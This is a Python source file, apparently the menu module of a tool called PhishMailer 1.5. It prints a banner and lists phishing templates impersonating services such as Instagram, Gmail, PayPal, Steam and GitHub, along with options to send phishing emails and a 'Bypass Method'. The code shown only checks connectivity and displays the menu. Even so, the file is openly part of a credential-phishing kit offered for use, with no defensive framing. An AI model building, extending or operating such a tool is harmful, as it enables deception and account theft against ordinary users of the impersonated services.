import os 
import sys
import time
from urllib.request import urlopen
from Core.helper.color import green, white, blue, red, start, alert, numbering
from Core.helper.animation import AnimationMain

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False

def pre():
    if connected() == False:
        print(alert + " Not Connected, Can't Send Emails, Exiting...")    
        sys.exit()

def menu():
	AnimationMain()
	print(green + """
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~
 PhishMailer Version 1.5     .                     .              |
 Coded By BiZken             .                     .              |
 bizken@protonmail.com       .   /                  .  ___        |
 Instagram: bizk3n            . /--\ /                /   \       |
          .                    <o)  =<               /     \      J
          .                     \__/ \              (__O_O__)
 |  |    .                       \                    |||||
  \/        Y           )                             |||||
  |  /!-!\  |          (                           \_///| \\__/
   \|     |/            )                           _// |  \_
    _\___/_            (   (                         / /
   / /   \ \            )   )
^^^^^^^^^^^^^^^^\      (   (
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\                /^^
                                                   ^^^^^^^^^^^^^^^^ """)

	print(alert + " More Versions Will Come Soon Stay Updated, Follow My Github\n")
	print(white + "options:")
	print(green + "[" + white + "1" + green + "]" + white + " Instagram" + green + "			[" + white + "11" + green + "]" + white + " Paypal")
	print(green + "[" + white + "2" + green + "]" + white + " Facebook" + green + "			[" + white + "12" + green + "]" + white + " Discord")
	print(green + "[" + white + "3" + green + "]" + white + " Gmail" + green + "			[" + white + "13" + green + "]" + white + " Spotify")
	print(green + "[" + white + "4" + green + "]" + white + " Gmail (simple)" + green + "		[" + white + "14" + green + "]" + white + " Blockchain")
	print(green + "[" + white + "5" + green + "]" + white + " Twitter" + green + "			[" + white + "15" + green + "]" + white + " RiotGames")
	print(green + "[" + white + "6" + green + "]" + white + " Snapchat" + green + "			[" + white + "16" + green + "]" + white + " Rockstar")
	print(green + "[" + white + "7" + green + "]" + white + " Snapchat (simple)" + green + "		[" + white + "17" + green + "]" + white + " AskFM")
	print(green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "18" + green + "]" + white + " 000Webhost")
	print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green + "			[" + white + "19" + green + "]" + white + " Dreamteam")
	print(green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "20" + green + "]" + white + " Gamehag")
	print(green + "[" + white + "21" + green + "]" + white + " Youtube" + green + "			[" + white + "22" + green + "]" + white + " Mega")
	print(green + "[" + white + "23" + green + "]" + white + " Github")
	print(green + "-----------------------------------------------------------------------")
	print(green + "[" + white + "30" + green + "]" + white + " Send Phishing Email")
	print(green + "[" + white + "69" + green + "]" + white + " Bypass Method " + blue + " [1] " + alert + red + " {NEW}")
	print(green + "[" + white + "99" + green + "]" + red + " EXIT")
	print(green + "[" + white + "1337" + green + "]" + white + " Info")
	print(green + "[" + white + "4444" + green + "]" + white + " ToDo List\n")

def Welcome():
	os.system("clear")
	
